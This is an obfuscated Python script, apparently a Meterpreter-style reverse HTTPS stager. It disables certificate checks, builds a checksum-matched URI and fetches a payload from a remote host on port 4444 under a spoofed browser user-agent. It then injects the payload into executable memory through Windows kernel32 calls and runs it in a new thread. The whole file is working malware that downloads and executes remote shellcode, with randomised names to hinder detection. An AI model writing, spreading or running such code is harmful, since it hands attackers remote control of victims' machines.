import urllib.request, string, random, struct, time, ssl, ctypes as OiHPWHQYsw
ssl._create_default_https_context = ssl._create_unverified_context
def gyTyGCPXtdRLGuy(s): return sum([ord(ch) for ch in s]) % 0x100
def TPeKaQZEUgGmhxt():
	for x in range(64):
		ZAvHxFZJFmydH = ''.join(random.sample(string.ascii_letters + string.digits,3))
		mKhKwMFchXfXCVh = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
		for rMDNTHcTQQnlFx in mKhKwMFchXfXCVh:
			if gyTyGCPXtdRLGuy(ZAvHxFZJFmydH + rMDNTHcTQQnlFx) == 92: return ZAvHxFZJFmydH + rMDNTHcTQQnlFx
def jxtdofZrXub(CvBwefnv,HFGCdC):
	kLTgnroaZgnpkg = urllib.request.ProxyHandler({})
	bjqMekQluZdI = urllib.request.build_opener(kLTgnroaZgnpkg)
	urllib.request.install_opener(bjqMekQluZdI)
	cvXAgRVucmt = urllib.request.Request("https://" + CvBwefnv + ":" + str(HFGCdC) + "/" + TPeKaQZEUgGmhxt(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})
	try:
		CoAXgePSuooJwL = urllib.request.urlopen(cvXAgRVucmt)
		try:
			if int(CoAXgePSuooJwL.info()["Content-Length"]) > 100000: return CoAXgePSuooJwL.read()
			else: return ''
		except: return CoAXgePSuooJwL.read()
	except urllib.request.URLError: return ''
def HlpNpNLmPyKZEQH(dffbOwDSWhCGP):
	if dffbOwDSWhCGP != "":
		QOSEsYFRqM = bytearray(dffbOwDSWhCGP)
		cfFZGC = OiHPWHQYsw.windll.kernel32.VirtualAlloc(OiHPWHQYsw.c_int(0),OiHPWHQYsw.c_int(len(QOSEsYFRqM)), OiHPWHQYsw.c_int(0x3000),OiHPWHQYsw.c_int(0x40))
		GYmnUgqzxI = (OiHPWHQYsw.c_char * len(QOSEsYFRqM)).from_buffer(QOSEsYFRqM)
		OiHPWHQYsw.windll.kernel32.RtlMoveMemory(OiHPWHQYsw.c_int(cfFZGC),GYmnUgqzxI, OiHPWHQYsw.c_int(len(QOSEsYFRqM)))
		SzHpdV = OiHPWHQYsw.windll.kernel32.CreateThread(OiHPWHQYsw.c_int(0),OiHPWHQYsw.c_int(0),OiHPWHQYsw.c_int(cfFZGC),OiHPWHQYsw.c_int(0),OiHPWHQYsw.c_int(0),OiHPWHQYsw.pointer(OiHPWHQYsw.c_int(0)))
		OiHPWHQYsw.windll.kernel32.WaitForSingleObject(OiHPWHQYsw.c_int(SzHpdV),OiHPWHQYsw.c_int(-1))
yQDMUUxsfjFY = ''
yQDMUUxsfjFY = jxtdofZrXub("8.8.8.8", 4444)
HlpNpNLmPyKZEQH(yQDMUUxsfjFY)